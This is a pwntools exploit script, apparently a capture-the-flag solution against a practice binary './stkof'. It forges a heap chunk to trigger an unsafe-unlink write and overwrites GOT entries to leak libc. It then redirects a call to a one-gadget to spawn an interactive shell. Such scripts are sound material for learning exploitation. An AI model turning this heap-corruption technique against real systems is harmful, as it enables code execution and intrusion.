from pwn import *


def add(size):
  p.sendline(b"1")
  p.sendline(str(size).encode())
  print (p.recvuntilb("OK\n"))

def scan(index, size, data):
  p.sendline(b"2")
  p.sendline(str(index).encode())
  p.sendline(str(size).encode())
  p.send(data)
  print (p.recvuntilb("OK\n"))

def remove(index):
  p.sendline(b"3")
  p.sendline(str(index).encode())
  print (p.recvuntil(b"OK\n"))

def view(index):
  p.sendline(b"4")
  p.sendline(str(index).encode())
  leak = p.recvline()
  leak = leak.replace(b"\x0a", b"")
  leak = u64(leak + b"\x00"*(8-len(leak)))
  print (hex(leak))
  p.recvuntil(b"OK\n")
  return leak

env = {}
# env["LD_PRELOAD"] = "./glibc/libc.so.6"
elf = context.binary = ELF("./stkof")
context.log_level='ERROR'
p = process(env=env,level="error")
libc = p.libc



ptr = 0x602140 + 4 * 8


add(0xa0) # 1
add(0xa0) # 2
add(0xa0) # 3 
add(0xa0) # 4
add(0xa0) # 5
add(0xa0) # 6

fake = p64(0x0)
fake += p64(0xa0)
fake += p64(ptr - 3 * 8) # fd->bk = bk
fake += p64(ptr - 2 * 8) # bk->fd = fd
fake += p64(0x0)
fake = fake.ljust(0xa0,b"A")
fake += p64(0xa0)
fake += p64(0xb0)

scan(4,len(fake),fake) # 4 will overflow to 5
remove(5)

scan(4,0x10,p64(elf.got["malloc"]) + p64(elf.got["strlen"]))
scan(2,0x8,p64(elf.sym["puts"]))

LEAK = view(1) 
libc.address = LEAK - 0x83550


ONE_SHOT = libc.address + 0xef9f4
scan(2,0x8,p64(ONE_SHOT))
print("         ",hex(ONE_SHOT))
# gdb.attach(p)
p.sendline("4\n1")





p.interactive()